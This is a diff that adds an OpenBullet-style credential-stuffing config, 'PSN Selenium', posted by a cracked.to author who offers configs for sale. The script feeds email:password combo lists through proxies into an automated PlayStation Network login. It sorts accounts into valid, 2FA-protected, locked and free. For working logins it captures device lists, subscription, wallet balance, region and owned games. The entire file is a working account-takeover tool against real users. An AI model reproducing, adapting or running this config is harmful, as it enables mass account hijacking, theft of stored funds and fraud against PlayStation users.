@@ -1,0 +1,286 @@
+[SETTINGS]
+{
+  "Name": "PSN Selenium",
+  "SuggestedBots": 10,
+  "MaxCPM": 0,
+  "LastModified": "2020-02-03T03:29:07.374489-08:00",
+  "AdditionalInfo": "for buy config dm me ",
+  "Author": "cracked.to/@sombreee",
+  "Version": "1.4.1 [Anomaly]",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [
+    {
+      "SliceName": "USER",
+      "RuleType": 2,
+      "RuleString": "8",
+      "Id": 1065581355
+    },
+    {
+      "SliceName": "USER",
+      "RuleType": 3,
+      "RuleString": "63",
+      "Id": 196494705
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 2,
+      "RuleString": "8",
+      "Id": 253867133
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 3,
+      "RuleString": "30",
+      "Id": 1071117210
+    },
+    {
+      "SliceName": "PASS",
+      "RuleType": 0,
+      "RuleString": "Digit",
+      "Id": 491903330
+    }
+  ],
+  "CustomInputs": [
+    {
+      "Description": "for buy config dm me in discord  or telegram ",
+      "VariableName": "",
+      "Id": 169718040
+    }
+  ],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": true,
+  "AlwaysQuit": true,
+  "DisableNotifications": false,
+  "CustomUserAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.79 Safari/537.36",
+  "RandomUA": true,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://store.playstation.com/kamaji/api/valkyrie_storefront/00_09_000/user/profile" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+REQUEST GET "https://auth.api.sonyentertainmentnetwork.com/2.0/ssocookie" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Success OR 
+    KEY "Session Expired" 
+    KEY "{\"error\":\"invalid_grant\",\"error_description\":\"Invalid login\",\"error_code\":20,\"docs\":\"https://auth.api.sonyentertainmentnetwork.com/docs/\",\"parameters\":[]}" 
+  KEYCHAIN Ban OR 
+    KEY "Es konnte keine Verbindung zum Server hergestellt werden" 
+
+#OPEN BROWSERACTION Open 
+
+#W BROWSERACTION SetWidth 
+
+#H BROWSERACTION SetHeight 
+
+#NAV NAVIGATE "https://id.sonyentertainmentnetwork.com/signin/?client_id=fe1fdbfa-f1a1-47ac-b793-e648fba25e86&redirect_uri=https://store.playstation.com/&service_entity=urn:service-entity:psn&response_type=code&scope=psn:s2s&ui=pr&service_logo=ps&request_locale=de_de" 
+
+FUNCTION Delay "5000" -> VAR "D1" 
+
+#active_cookie ELEMENTACTION Id "js-SIEWS1lib-header-ManageCookies" 
+  Click 
+
+#cookie ELEMENTACTION Id "js-SIEWS1lib-header-CookieChk" 
+  Click "<PASS>" 
+
+#save ELEMENTACTION Id "js-SIEWS1lib-header-Save" 
+  Click "<OK>" 
+
+#pass ELEMENTACTION Id "ember21" 
+  SendKeys "<PASS>" 
+
+#user ELEMENTACTION Id "ember19" 
+  SendKeys "<USER>" 
+
+FUNCTION Delay "2000" -> VAR "D2" 
+
+#login ELEMENTACTION Class "caption" 
+  Click "<SignIn>" 
+
+FUNCTION Delay "10000" -> VAR "D3" 
+
+#key ELEMENTACTION Selector "#ember36 > div.columns-center.row-unshrink > div > div:nth-child(5) > div" 
+  GetText -> VAR "111" 
+
+#key1 ELEMENTACTION Selector "#ember11 > div.columns-center.row-unshrink.page-parent.entrance > div > div.grid-parent.description-regular > div" 
+  GetText -> VAR "222" 
+
+#key2 ELEMENTACTION Selector "#ember30 > div.rows.page-items.row-unshrink.row-flex > div.grid-parent.description-regular > div" 
+  GetText -> VAR "333" 
+
+#key3 ELEMENTACTION Selector "#ember36 > div.columns-center.row-unshrink.page-parent > div > div:nth-child(3) > div" 
+  GetText -> VAR "444" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "Session Expired" 
+    KEY "{\"error\":\"invalid_grant\",\"error_description\":\"Invalid login\",\"error_code\":20,\"docs\":\"https://auth.api.sonyentertainmentnetwork.com/docs/\",\"parameters\":[]}" 
+    KEY "<ADDRESS>" Contains "https://store.playstation.com/" 
+  KEYCHAIN Ban OR 
+    KEY "Es konnte keine Verbindung zum Server hergestellt werden" 
+    KEY "<ADDRESS>" EqualTo "https://id.sonyentertainmentnetwork.com/signin/" 
+    KEY "<222>" Contains "Es konnte" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<111>" Contains "Veri" 
+  KEYCHAIN Failure OR 
+    KEY "<222>" Contains "Die Anmelde-ID (E-Mail-Adresse) oder das Passwort ist nicht richtig." 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "<333>" Contains "Dein Konto wurde gesperrt. Setze dein Passwort zurück." 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "<444>" Contains "Die zweistufige Verifizierung ist aktiviert. Sieh auf deinem Mobiltelefon nach einer SMS. Gib diesen Code in das Feld für die Codeeingabe ein." 
+    KEY "<444>" Contains "SMS" 
+  KEYCHAIN Custom "FREE" OR 
+    KEY "<ADDRESS>" Contains "https://id.sonyentertainmentnetwork.com/upgrade_account/#/upgrade_account?" 
+
+#NAV NAVIGATE "https://store.playstation.com/kamaji/api/valkyrie_storefront/00_09_000/user/profile" 
+
+KEYCHECK 
+  KEYCHAIN Ban OR 
+    KEY "A connection to the server could not be established" 
+    KEY "The connection to the server timed out" 
+  KEYCHAIN Success OR 
+    KEY "{\"member_type\":\"" 
+    KEY "\"success\"" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<ADDRESS>" EqualTo "https://id.sonyentertainmentnetwork.com/signin/?response_type=code&redirect_uri=https%3A%2F%2Fstore.playstation.com%2Fen-gb%2Fhome%2Fgames&client_id=f6c7057b-f688-4744-91c0-8179592371d2&scope=kamaji%3Acommerce_native%2Ckamaji%3Acommerce_container%2Ckamaji%3Alists&prompt=login&state=returning&request_locale=en_GB&service_entity=urn%3Aservice-entity%3Apsn&hidePageElements=SENLogo&disableLinks=SENLink&ui=pr&error=login_required&error_code=4165&error_description=User+is+not+authenticated&no_captcha=false#/signin/force_password_reset?entry=%2Fsignin" 
+  KEYCHAIN Failure OR 
+    KEY "Session Expired" 
+
+NAVIGATE "https://id.sonyentertainmentnetwork.com/id/management/" 
+
+BROWSERACTION DOMtoSOURCE "<SOURCE>" 
+
+NAVIGATE "https://account.sonyentertainmentnetwork.com/liquid/cam/devices/device-list.action" 
+
+BROWSERACTION DOMtoSOURCE "<SOURCE>" 
+
+NAVIGATE "https://account.sonyentertainmentnetwork.com/liquid/cam/devices/device-list.action?category=psn&displayNavigation=false" 
+
+BROWSERACTION DOMtoSOURCE "<SOURCE>" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<ADDRESS>" DoesNotContain "https://account.sonyentertainmentnetwork.com/liquid/cam/devices/device-list.action?category=psn&displayNavigation=false" 
+
+ELEMENTACTION XPath "/html/body/section/section[2]/section/ul/li[4]/a" Recursive=TRUE 
+  GetText -> CAP "Device Count" 
+
+ELEMENTACTION Class "liquidDeviceBox" Recursive=TRUE 
+  GetText -> CAP "Device Name" 
+
+IF "<SOURCE>" DoesNotContain "id=\"deactivateAllButton\""
+
+#DENO FUNCTION Constant "No" -> CAP "Deactivable" 
+
+ELSE
+
+#DEYES FUNCTION Constant "Yes" -> CAP "Deactivable" 
+
+ENDIF 
+
+#NAVIGATE0 NAVIGATE "https://store.playstation.com/subscriptions" 
+
+BROWSERACTION DOMtoSOURCE "<SOURCE>" 
+
+FUNCTION Delay "5000" -> VAR "D1" 
+
+ELEMENTACTION Selector "#ember759 > div.modal-dialog__content > button" Recursive=TRUE 
+  Click 
+
+ELEMENTACTION Selector "#ember1428 > div.modal-dialog__content > button" Recursive=TRUE 
+  Click 
+
+ELEMENTACTION Selector "#ember1428 > div.modal-dialog__content > button" Recursive=TRUE 
+  Click 
+
+FUNCTION Delay "5000" -> VAR "D1" 
+
+PARSE "<ADDRESS>" LR "https://store.playstation.com/" "/" -> VAR "Locale" 
+
+FUNCTION RegexMatch "(?<=-)(.*)" "<Locale>" -> CAP "Country/Region" 
+
+FUNCTION Constant "https://store.playstation.com/<Locale>/subscriptions" -> VAR "SUBSCRIPTION" 
+
+NAVIGATE "<SUBSCRIPTION>" 
+
+ELEMENTACTION XPath "/html/body/div[3]/div/div/div[2]/div/div[3]" Recursive=TRUE 
+  GetText -> CAP "Subscription" 
+
+ELEMENTACTION XPath "/html/body/div[3]/div/div/div[1]/div/div[3]" Recursive=TRUE 
+  GetText -> CAP "Subscription" 
+
+BROWSERACTION GetCookies 
+
+REQUEST GET "https://store.playstation.com/kamaji/api/valkyrie_storefront/00_09_000/user/checkout/cart" 
+  
+  HEADER "User-Agent: <UA>" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Host: store.playstation.com" 
+  HEADER "X-Requested-By: Chihiro-PSStore" 
+  HEADER "Referer: https://store.playstation.com/<Locale>/subscriptions" 
+
+NAVIGATE "https://store.playstation.com/kamaji/api/valkyrie_storefront/00_09_000/user/checkout/cart" 
+
+BROWSERACTION DOMtoSOURCE "<SOURCE>" 
+
+FUNCTION Delay "5000" -> VAR "D3" 
+
+PARSE "<SOURCE>" LR "\"wallet_balance\":\"" "\"" -> CAP "Wallet Balance" 
+
+#NAVIGATE1 NAVIGATE "https://store.playstation.com/<Locale>/download/list" 
+
+BROWSERACTION DOMtoSOURCE "<SOURCE>" 
+
+FUNCTION Delay "10000" -> VAR "D4" 
+
+ELEMENTACTION Selector "a[class='download-list-item__title internal-app-link ember-view']" Recursive=TRUE 
+  GetText -> CAP "Game" 
+
+EXECUTEJS "document.getElementsByTagName(\"a\").href;" 
+
+FUNCTION Delay "5000" -> VAR "D5" 
+
+FUNCTION ClearCookies "<COOKIES>" 
+
+BROWSERACTION ClearCookies "<COOKIES>" 
+
+#CLOSE BROWSERACTION Close 
+
